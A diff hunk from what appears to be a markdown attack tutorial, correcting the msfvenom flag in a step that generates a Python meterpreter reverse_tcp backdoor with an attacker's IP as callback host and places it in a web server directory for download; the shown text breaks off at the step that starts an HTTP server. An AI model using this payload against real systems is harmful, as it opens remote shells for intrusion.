@@ -12,7 +12,7 @@ We need to use Metasploit Framework and simple http server, you can use Kali Lin
 
 1. Generate a backdoor file
 ```
-msfvenom payload python/meterpreter/reverse_tcp LHOST=attacker's IP LPORT=8080 > /var/www/html/path/to/file
+msfvenom -p python/meterpreter/reverse_tcp LHOST=attacker's IP LPORT=8080 > /var/www/html/path/to/file
 ```
 2. Run simple HTTP server 
 ```
